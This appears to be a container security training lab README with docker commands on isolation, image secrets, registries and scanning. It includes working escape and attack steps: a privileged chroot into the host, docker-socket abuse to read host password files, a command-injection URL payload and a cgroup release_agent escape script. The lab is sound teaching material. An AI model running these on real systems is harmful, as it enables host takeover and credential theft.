# OWASP Container Security Training 2019

## Containment primitivies

Run "ip" tool from an alpine based container to see what IP you get

    docker run --rm -it alpine ip addr show

Set network namespace to host and see the network stack now

    docker run --rm -it --net=host alpine ip addr show

Check what processes can the container see

    docker run --rm -it alpine ps -ef

Set pid namespace to the host and check the process space now

    docker run --rm -it --pid=host alpine ps -ef

Check a process inside the container

    docker run --rm -d --name sleeper alpine sleep 300
    docker exec sleeper ps

And outside

    ps -ef | grep sleep

Now, disable all the checks to get root on your host:

    docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host alpine chroot /host

## Container user

Run the alpine container and check the file system

    docker run --rm -it alpine

    ls -al
    exit

Run it again, mounting host file system and access a root file

    docker run --rm -it -v /:/x/ alpine

    ls -al /x/
    cat /x/etc/shadow

Switching to a non-root user in the image

    cd 1
    docker build -t alpine-nobody .
    docker run --rm -it -v /:/x/ alpine-nobody
    cat /x/etc/shadow

Switching to a non-root user in the container

    docker run --rm -it -v /:/x/ -u nobody alpine
    cat /x/etc/shadow

## Security profiles

Elevate nobody to root

    docker run --rm -it -u nobody alpine unshare --map-root-user --user sh -c id

Now try this

    docker run --rm -it -u nobody --security-opt seccomp=unconfined alpine unshare --map-root-user --user sh -c id

and another

    docker run --rm -it -u nobody --privileged alpine unshare --map-root-user --user sh -c id

and another

    docker run --rm -it -u nobody --cap-add CAP_SYS_ADMIN alpine unshare --map-root-user --user sh -c id

but there is one thing...

    cd 2
    docker build -t superalpine .
    docker run --rm -it -u nobody superalpine id

Can you guess why this is happening?

    docker run --rm -it -u nobody --security-opt=no-new-privileges superalpine id

Why does this work?

Checking the containment profiles

    curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64" -o amicontained
    chmod a+x amicontained
    docker run --rm -it -v $PWD:/x/ ubuntu:18.04 /x/amicontained

## Build context and history

Build an image and check it

    cd 3
    docker build -t tool .
    docker run --rm -it tool
    docker run --rm -it tool cat prod.env
    docker run --rm -it tool cat dev.env

How did prod.env ended up in the image?

    docker save tool -o toolimg.tar
    tar xvf toolimg.tar
    tar xvf 7f06f4b7100f3053cd6332fdfe924a0524976275b44f7371cf3e3332dc4c1101/layer.tar
    cat prod.env

How did we find dev.env?

    docker inspect tool | grep sha256
    docker build -t tool2 -f Dockerfile-2 .
    docker inspect tool2 | grep sha256

Why is the number of layers different? Can we find dev.env again?

    docker build -t tool3 -f Dockerfile-3 .
    docker run --rm tool3

ENV does not create an image layer. Is it now forgotten?

    docker history tool3

How about providing a secret ENV variable not at the build time, but at the run time?

    docker run --name tool4 -e DB_PASSWORD=runtime_API_key -d alpine sleep 300
    docker exec -it tool4 env
    docker inspect tool4 | grep PASS

## Shared socket

    docker run --rm -ti -v /var/run/docker.sock:/var/run/docker.sock alpine
    apk add curl
    curl --unix-socket /var/run/docker.sock http://x/containers/json

Thats shows the container you are running in.

Create a new container from inside the current one

    curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
        -d '{"Image": "alpine","Volumes": {"/hostos/": {}},"Cmd":["sleep","300"], "HostConfig": {"Binds": ["/:/hostos"]}}' http://x/containers/create?name=rooter

Start it

    curl --unix-socket /var/run/docker.sock -XPOST http://x/containers/rooter/start

Read host passwords

    curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
     -d '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/hostos/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://x/containers/rooter/exec

Grab the ID and use it in this command

    curl --unix-socket /var/run/docker.sock  -H 'Content-Type: application/json' -XPOST --data-binary '{"Detach": false,"Tty": false}' http://x/exec/<exec ID here>/start --output - 

## Image Supply chain

Start a local registry server

    docker run --name registry -d -p 5000:5000 registry:2

There is a base container that your own container starts from, with some base tooling in it

    docker build -t localhost:5000/toolbase:1.0 -f Dockerfile_base .
    docker push localhost:5000/toolbase:1.0
    docker build -t localhost:5000/awesometool:1.1  .
    docker push localhost:5000/awesometool:1.1

You run your container

    docker run --rm localhost:5000/awesometool:1.1

Everything seems normal. And clean up your environment

    docker image rm localhost:5000/toolbase:1.0
    docker image rm localhost:5000/awesometool:1.1

Now somebody does this on their machine

    docker build -t localhost:5000/toolbase:1.0 -f Dockerfile_evil_base .
    docker push localhost:5000/toolbase:1.0
    docker image rm localhost:5000/toolbase:1.0

You are a developer, rebuilding your container yet again

    docker build -t localhost:5000/awesometool:1.1  .

And running it

    docker run --rm --name awesometool localhost:5000/awesometool:1.1

Waht do you see? Now stop it

    docker kill awesometool 

Enumerating vulnerable registries

    curl http://localhost:5000/v2/_catalog
    curl http://localhost:5000/v2/awesometool/tags/list

## Windows containers

    docker run -it --rm -v c:/:c:/host mcr.microsoft.com/windows/servercore:1809 powershell
    whoami

But you have admin rights on your box

    echo $null >> /host/windows/system32/test

What is available for your container

    Get-WindowsFeature

## Application Security

Build and run a vulnerable app

    cd 5
    docker build -t dsvw .
    docker run -p 1234:65412 -v /:/www -it dsvw

Now browse and to an RCE

    http://localhost:1234/?domain=www.google.com%3B%20cat%20/www/etc/passwd

Scanning with Trivy

WARNING - this will pull a ton of stuff from the internet and save it to a .cache folder in the current folder.

    docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v $PWD/.cache:/root/.cache/ aquasec/trivy localhost:5000/awesometool:1.1

Is this information relevant?

    docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v $PWD/.cache:/root/.cache/ aquasec/trivy node:lts-jessie-slim

What do you think about this?

Scanning with Clair

    mkdir $PWD/clair_config
    curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o $PWD/clair_config/config.yaml
    docker run -d -e POSTGRES_PASSWORD="" -p 5432:5432 postgres:9.6
    docker run --net=host -d -p 6060-6061:6060-6061 -v $PWD/clair_config:/config quay.io/coreos/clair-git:latest -config=/config/config.yaml

## Distroless and multistage builds

Build a webserver that has no beginnings using first stage to build, and the scratch to run

    cd 6
    docker build -t httpsrv .
    docker run --name srv -d --rm -p 1230:5000 -v $PWD:/www httpsrv

Browse to http://localhost:1230/ to verify that its running.

Now try entering shell in this container

    docker exec -it srv /bin/sh

Now export the image and check tar contents

    docker save httpsrv -o srv.tar

What do you see?

Try the same on a distroless base

    docker run -it gcr.io/distroless/base /bin/sh


## Extra credit

Escape a container with a SYS_ADMIN cap

Spawn a new container to exploit

    docker run --rm -it --privileged ubuntu bash

Now run the following inside the container

    d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
    mkdir -p $d/w;echo 1 >$d/w/notify_on_release
    t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
    chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o

It abuses the functionality of the notify_on_release feature in cgroups v1 to run the exploit as a fully privileged root user. For this to work

* We must be running as root inside the container
* The container must be run with the SYS_ADMIN Linux capability
* The container must lack an AppArmor profile, or otherwise allow the mount syscall
* The cgroup v1 virtual filesystem must be mounted read-write inside the container

Which translates to

    --security-opt apparmor=unconfined --cap-add=SYS_ADMIN

Protecting against DoS via resource overuse

    docker run -d --name c768 --cpuset-cpus 0 --cpu-shares 768 benhall/stress

CGroups Examples:
--cpu-shares
--cpuset-cpus
--memory-reservation
--kernel-memory
--blkio-weight (block  IO)
--device-read-iops
--device-write-iops

https://docs.docker.com/config/containers/resource_constraints/

Running dockerized Linux GUI app. Share your XServer

    xhost +local:

Run the app, sharing X11 socket

    docker run --rm -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix:ro alexivkin/mssqlops $*

What security issues does this command introduce?
